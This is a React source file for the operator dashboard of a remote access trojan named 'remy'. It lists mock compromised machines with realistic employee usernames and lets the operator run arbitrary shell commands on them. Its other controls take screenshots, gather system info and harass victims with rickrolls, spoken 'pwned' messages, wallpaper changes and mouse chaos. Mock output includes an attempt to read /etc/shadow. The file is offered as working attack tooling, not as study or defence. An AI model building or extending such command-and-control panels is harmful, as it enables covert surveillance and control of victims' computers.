import { useState, useEffect } from 'react'
import { Monitor, Terminal, Play, Volume2, Camera, Skull, Image, Mouse, Trash2, RefreshCw } from 'lucide-react'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { ScrollArea } from '@/components/ui/scroll-area'

interface Implant {
  id: string
  hostname: string
  os: string
  username: string
  ip: string
  last_seen: string
  country: string
  status: 'online' | 'idle' | 'offline'
}

interface CommandResult {
  command_id: string
  success: boolean
  output: string
  timestamp: string
  type: string
}

const MOCK_IMPLANTS: Implant[] = [
  { id: 'imp-001', hostname: 'DESKTOP-KAREN', os: 'Windows 11 x64', username: 'karen.manager', ip: '192.168.1.105', last_seen: '2s ago', country: 'US', status: 'online' },
  { id: 'imp-002', hostname: 'ubuntu-dev-01', os: 'Ubuntu 22.04 x86_64', username: 'developer', ip: '10.0.0.42', last_seen: '15s ago', country: 'DE', status: 'online' },
  { id: 'imp-003', hostname: 'MacBook-Pro-Finance', os: 'macOS 14.2 arm64', username: 'cfo.johnson', ip: '192.168.2.88', last_seen: '1m ago', country: 'US', status: 'online' },
  { id: 'imp-004', hostname: 'WIN-SERVER2019', os: 'Windows Server 2019', username: 'Administrator', ip: '10.10.10.5', last_seen: '3m ago', country: 'NL', status: 'idle' },
  { id: 'imp-005', hostname: 'raspberrypi', os: 'Raspbian 11 armv7l', username: 'pi', ip: '192.168.1.200', last_seen: '5m ago', country: 'UK', status: 'idle' },
  { id: 'imp-006', hostname: 'kali-pentest', os: 'Kali 2024.1 x86_64', username: 'root', ip: '172.16.0.99', last_seen: '12m ago', country: 'RU', status: 'idle' },
  { id: 'imp-007', hostname: 'ACCOUNTING-PC3', os: 'Windows 10 x64', username: 'bob.accountant', ip: '192.168.1.115', last_seen: '45m ago', country: 'US', status: 'offline' },
  { id: 'imp-008', hostname: 'docker-host-prod', os: 'Alpine 3.18 x86_64', username: 'docker', ip: '10.20.30.40', last_seen: '2h ago', country: 'SG', status: 'offline' },
  { id: 'imp-009', hostname: 'HR-LAPTOP-SARAH', os: 'Windows 11 x64', username: 'sarah.hr', ip: '192.168.1.150', last_seen: '30s ago', country: 'US', status: 'online' },
  { id: 'imp-010', hostname: 'gaming-rig-IT', os: 'Windows 11 x64', username: 'chad.it', ip: '192.168.1.69', last_seen: '1m ago', country: 'US', status: 'online' },
  { id: 'imp-011', hostname: 'nas-synology', os: 'DSM 7.2 x86_64', username: 'admin', ip: '192.168.1.10', last_seen: '8m ago', country: 'US', status: 'idle' },
  { id: 'imp-012', hostname: 'aws-ec2-web', os: 'Amazon Linux 2023', username: 'ec2-user', ip: '54.210.123.45', last_seen: '20s ago', country: 'US', status: 'online' },
]

const MOCK_RESULTS: CommandResult[] = [
  { command_id: 'cmd-001', success: true, output: 'root', timestamp: '14:32:01', type: 'Exec' },
  { command_id: 'cmd-002', success: true, output: 'Linux ubuntu-dev-01 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux', timestamp: '14:32:15', type: 'Exec' },
  { command_id: 'cmd-003', success: true, output: 'Screenshot captured (1920x1080, 245KB)', timestamp: '14:33:02', type: 'Screenshot' },
  { command_id: 'cmd-004', success: false, output: 'Permission denied: /etc/shadow', timestamp: '14:33:45', type: 'Exec' },
  { command_id: 'cmd-005', success: true, output: 'Playing rickroll.mp4...', timestamp: '14:34:12', type: 'Rickroll' },
  { command_id: 'cmd-006', success: true, output: 'OS: Windows 11 Pro\nCPU: Intel i7-12700K (12 cores)\nRAM: 32GB\nDisk: 512GB SSD (234GB free)\nUptime: 3 days 14:22:05', timestamp: '14:35:00', type: 'SysInfo' },
]

function App() {
  const [implants, setImplants] = useState<Implant[]>([])
  const [selected, setSelected] = useState<string | null>(null)
  const [command, setCommand] = useState('')
  const [results, setResults] = useState<CommandResult[]>([])
  const [loading, setLoading] = useState(false)
  const [filter, setFilter] = useState<'all' | 'online' | 'idle' | 'offline'>('all')

  useEffect(() => {
    fetchImplants()
    const interval = setInterval(fetchImplants, 5000)
    return () => clearInterval(interval)
  }, [])

  async function fetchImplants() {
    try {
      const res = await fetch('/api/implants')
      if (res.ok) {
        setImplants(await res.json())
      }
    } catch {
      setImplants(MOCK_IMPLANTS)
      setResults(MOCK_RESULTS)
    }
  }

  async function sendCommand(type: string, args?: Record<string, unknown>) {
    if (!selected) return
    setLoading(true)
    try {
      const res = await fetch(`/api/implants/${selected}/command`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ command: { type, args } })
      })
      if (res.ok) {
        const { command_id } = await res.json()
        setTimeout(() => checkResult(command_id), 2000)
      }
    } catch {
      const mockOutputs: Record<string, string> = {
        'SysInfo': 'OS: Windows 11 Pro\nCPU: Intel i7-12700K (12 cores)\nRAM: 32GB\nDisk: 512GB SSD (234GB free)\nUptime: 3 days 14:22:05',
        'Screenshot': 'Screenshot captured (1920x1080, 312KB)',
        'Rickroll': 'Opening rickroll in default browser...',
        'Speak': `Speaking: "${args?.message || 'Hello from remy!'}"`,
        'Popup': 'Popup displayed',
        'Wallpaper': 'Wallpaper changed to remy logo',
        'MouseChaos': 'Mouse chaos activated for 10 seconds',
        'Exec': args?.cmd === 'whoami' ? implants.find(i => i.id === selected)?.username || 'user' : `$ ${args?.cmd}\n[output would appear here]`,
      }
      setResults(prev => [...prev, {
        command_id: `mock-${Date.now()}`,
        success: true,
        output: mockOutputs[type] || `[Mock] ${type} executed`,
        timestamp: new Date().toLocaleTimeString(),
        type
      }])
    }
    setLoading(false)
  }

  async function checkResult(cmdId: string) {
    try {
      const res = await fetch(`/api/results/${cmdId}`)
      if (res.ok) {
        const result = await res.json()
        setResults(prev => [...prev, result])
      }
    } catch {
      // ignore
    }
  }

  function execCommand() {
    if (command.trim()) {
      sendCommand('Exec', { cmd: command })
      setCommand('')
    }
  }

  const filteredImplants = implants.filter(i => filter === 'all' || i.status === filter)
  const selectedImplant = implants.find(i => i.id === selected)
  const stats = {
    total: implants.length,
    online: implants.filter(i => i.status === 'online').length,
    idle: implants.filter(i => i.status === 'idle').length,
    offline: implants.filter(i => i.status === 'offline').length,
  }

  return (
    <div className="flex h-screen bg-zinc-950 dark">
      {/* Sidebar */}
      <div className="w-72 bg-zinc-900 border-r border-zinc-800 flex flex-col">
        <div className="p-4 border-b border-zinc-800">
          <h1 className="text-xl font-bold text-white flex items-center gap-2">
            <Skull className="w-6 h-6 text-purple-500" />
            remy
          </h1>
          <p className="text-xs text-zinc-500 mt-1">Remote Access Trojan</p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-4 gap-1 p-2 text-center text-xs">
          <button onClick={() => setFilter('all')} className={`p-2 rounded ${filter === 'all' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
            <div className="text-white font-bold">{stats.total}</div>
            <div className="text-zinc-500">All</div>
          </button>
          <button onClick={() => setFilter('online')} className={`p-2 rounded ${filter === 'online' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
            <div className="text-green-400 font-bold">{stats.online}</div>
            <div className="text-zinc-500">Online</div>
          </button>
          <button onClick={() => setFilter('idle')} className={`p-2 rounded ${filter === 'idle' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
            <div className="text-yellow-400 font-bold">{stats.idle}</div>
            <div className="text-zinc-500">Idle</div>
          </button>
          <button onClick={() => setFilter('offline')} className={`p-2 rounded ${filter === 'offline' ? 'bg-zinc-700' : 'hover:bg-zinc-800'}`}>
            <div className="text-zinc-500 font-bold">{stats.offline}</div>
            <div className="text-zinc-500">Offline</div>
          </button>
        </div>

        {/* Device List */}
        <ScrollArea className="flex-1 p-2">
          <div className="space-y-1">
            {filteredImplants.map(imp => (
              <button
                key={imp.id}
                onClick={() => setSelected(imp.id)}
                className={`w-full text-left p-3 rounded-lg transition ${
                  selected === imp.id
                    ? 'bg-purple-600 text-white'
                    : 'bg-zinc-800 text-zinc-300 hover:bg-zinc-700'
                }`}
              >
                <div className="flex items-center justify-between">
                  <span className="font-medium truncate">{imp.hostname}</span>
                  <span className={`w-2 h-2 rounded-full ${
                    imp.status === 'online' ? 'bg-green-400' :
                    imp.status === 'idle' ? 'bg-yellow-400' : 'bg-zinc-600'
                  }`} />
                </div>
                <div className="text-xs opacity-70 truncate">{imp.username}@{imp.ip}</div>
                <div className="text-xs opacity-50 flex justify-between mt-1">
                  <span>{imp.os.split(' ')[0]}</span>
                  <span>{imp.last_seen}</span>
                </div>
              </button>
            ))}
          </div>
        </ScrollArea>
      </div>

      {/* Main */}
      <div className="flex-1 flex flex-col">
        {/* Header */}
        <div className="h-14 bg-zinc-900 border-b border-zinc-800 flex items-center justify-between px-6">
          <div className="flex items-center gap-4">
            <h2 className="text-white font-medium">
              {selectedImplant ? (
                <span className="flex items-center gap-2">
                  {selectedImplant.hostname}
                  <Badge variant={
                    selectedImplant.status === 'online' ? 'default' :
                    selectedImplant.status === 'idle' ? 'secondary' : 'outline'
                  } className={
                    selectedImplant.status === 'online' ? 'bg-green-600' :
                    selectedImplant.status === 'idle' ? 'bg-yellow-600' : ''
                  }>
                    {selectedImplant.status}
                  </Badge>
                </span>
              ) : 'Select a device'}
            </h2>
          </div>
          {selectedImplant && (
            <div className="text-sm text-zinc-400">
              {selectedImplant.ip} | {selectedImplant.os} | {selectedImplant.country}
            </div>
          )}
        </div>

        {/* Content */}
        <ScrollArea className="flex-1 p-6">
          {selected ? (
            <div className="space-y-6">
              {/* Quick Actions */}
              <div className="grid grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 gap-3">
                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('SysInfo')}>
                  <Monitor className="w-5 h-5 text-blue-400 mb-2" />
                  <span className="text-xs">Sysinfo</span>
                </Button>
                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Screenshot')}>
                  <Camera className="w-5 h-5 text-green-400 mb-2" />
                  <span className="text-xs">Screenshot</span>
                </Button>
                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Rickroll')}>
                  <Play className="w-5 h-5 text-red-400 mb-2" />
                  <span className="text-xs">Rickroll</span>
                </Button>
                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Speak', { message: 'You have been pwned!' })}>
                  <Volume2 className="w-5 h-5 text-yellow-400 mb-2" />
                  <span className="text-xs">Speak</span>
                </Button>
                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Popup')}>
                  <Image className="w-5 h-5 text-pink-400 mb-2" />
                  <span className="text-xs">Popup</span>
                </Button>
                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('Wallpaper')}>
                  <Image className="w-5 h-5 text-purple-400 mb-2" />
                  <span className="text-xs">Wallpaper</span>
                </Button>
                <Button variant="secondary" className="flex-col h-auto py-4" onClick={() => sendCommand('MouseChaos')}>
                  <Mouse className="w-5 h-5 text-orange-400 mb-2" />
                  <span className="text-xs">Mouse</span>
                </Button>
                <Button variant="destructive" className="flex-col h-auto py-4" onClick={() => sendCommand('Uninstall')}>
                  <Trash2 className="w-5 h-5 mb-2" />
                  <span className="text-xs">Uninstall</span>
                </Button>
              </div>

              {/* Command Input */}
              <Card className="bg-zinc-900 border-zinc-800">
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-zinc-400" />
                    Execute Command
                  </CardTitle>
                </CardHeader>
                <CardContent>
                  <div className="flex gap-2">
                    <Input
                      value={command}
                      onChange={(e: React.ChangeEvent<HTMLInputElement>) => setCommand(e.target.value)}
                      onKeyDown={(e: React.KeyboardEvent) => e.key === 'Enter' && execCommand()}
                      placeholder="whoami"
                      className="flex-1 bg-zinc-800 border-zinc-700 font-mono"
                    />
                    <Button onClick={execCommand} disabled={loading || !command.trim()} className="bg-purple-600 hover:bg-purple-500">
                      Run
                    </Button>
                  </div>
                </CardContent>
              </Card>

              {/* Results */}
              <Card className="bg-zinc-900 border-zinc-800">
                <CardHeader className="pb-2">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-sm flex items-center gap-2">
                      <Terminal className="w-4 h-4 text-zinc-400" />
                      Output
                    </CardTitle>
                    <Button variant="ghost" size="sm" onClick={() => setResults([])}>
                      <RefreshCw className="w-3 h-3" />
                    </Button>
                  </div>
                </CardHeader>
                <CardContent>
                  <ScrollArea className="h-96">
                    <div className="bg-zinc-950 rounded p-3 font-mono text-sm text-zinc-300">
                      {results.length === 0 ? (
                        <span className="text-zinc-500">No output yet</span>
                      ) : (
                        results.map((r, i) => (
                          <div key={i} className="mb-3 pb-3 border-b border-zinc-800 last:border-0">
                            <div className="flex items-center gap-2 text-xs text-zinc-500 mb-1">
                              <span className={r.success ? 'text-green-500' : 'text-red-500'}>{r.success ? 'OK' : 'ERR'}</span>
                              <span>{r.type}</span>
                              <span>{r.timestamp}</span>
                            </div>
                            <pre className="whitespace-pre-wrap text-zinc-300">{r.output}</pre>
                          </div>
                        ))
                      )}
                    </div>
                  </ScrollArea>
                </CardContent>
              </Card>
            </div>
          ) : (
            <div className="flex flex-col items-center justify-center h-full text-zinc-500">
              <Skull className="w-16 h-16 mb-4 opacity-20" />
              <p>Select a device from the sidebar</p>
              <p className="text-sm mt-2">{implants.length} implants connected</p>
            </div>
          )}
        </ScrollArea>
      </div>
    </div>
  )
}

export default App
